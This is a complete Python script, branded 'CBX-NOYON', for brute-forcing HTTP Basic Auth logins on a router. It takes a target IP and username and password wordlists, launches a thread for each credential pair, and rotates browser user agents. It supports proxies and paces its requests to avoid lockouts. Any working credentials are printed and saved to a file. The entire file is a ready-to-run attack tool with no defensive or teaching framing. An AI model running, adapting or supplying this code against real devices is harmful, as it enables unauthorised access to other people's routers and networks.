import requests
import threading
import random
import time

# Color codes for terminal output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# User agents list (add more if needed)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
]

# Proxy support (set to None if no proxy)
PROXY = None
# Example: PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Delay between requests in seconds (to reduce lockout chances)
DELAY_BETWEEN_REQUESTS = 0.5

lock = threading.Lock()
found = False

def try_login(url, username, password):
    global found
    if found:
        return
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        # Do NOT set Accept-Encoding here to let requests handle gzip properly
    }
    try:
        response = requests.get(url, auth=(username, password), headers=headers, proxies=PROXY, timeout=10)
        if response.status_code == 200:
            with lock:
                if not found:
                    found = True
                    print(f"\n{GREEN}[+] Password FOUND! -> {username}:{password} ✅{RESET}")
                    with open("found_credentials.txt", "a") as f:
                        f.write(f"{username}:{password}\n")
        else:
            sample = response.text[:100].replace('\n', ' ').replace('\r', ' ')
            print(f"{CYAN}[*] Trying {username}:{password} | Status: {response.status_code} | Sample: {sample}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[-] Request error for {username}:{password}: {e}{RESET}")
    time.sleep(DELAY_BETWEEN_REQUESTS)

def load_list(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}File not found: {file_path}{RESET}")
        exit(1)

def main():
    print(r"""
 __  __           _       _____            _
|  \/  | ___   __| | ___ |  ___|__  _ __  | | __ _ _   _
| |\/| |/ _ \ / _` |/ _ \| |_ / _ \| '__| | |/ _` | | | |
| |  | | (_) | (_| |  __/|  _| (_) | |    | | (_| | |_| |
|_|  |_|\___/ \__,_|\___||_|  \___/|_|    |_|\__,_|\__, |
                                                   |___/
HTTP Basic Auth Brute Forcer | Multi-threaded | CBX-NOYON
    """)

    router_ip = input("[?] Enter router IP (e.g. 192.168.1.1): ").strip()
    username_file = input("[?] Username list file path: ").strip()
    password_file = input("[?] Password list file path: ").strip()

    usernames = load_list(username_file)
    passwords = load_list(password_file)

    print(f"\n[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
    print(f"[+] Starting brute force on {router_ip} ...\n")

    url = f"http://{router_ip}/"

    threads = []

    for username in usernames:
        for password in passwords:
            if found:
                break
            t = threading.Thread(target=try_login, args=(url, username, password))
            threads.append(t)
            t.start()
            time.sleep(0.1)  # small delay to avoid flooding

        if found:
            break

    # Wait for all threads to finish
    for t in threads:
        t.join()

    if not found:
        print(f"\n{RED}[-] Password not found in the provided lists.{RESET}")
    print(f"{YELLOW}[-] Attack finished. CBX-NOYON signing off!{RESET}")

if __name__ == "__main__":
    main()
  
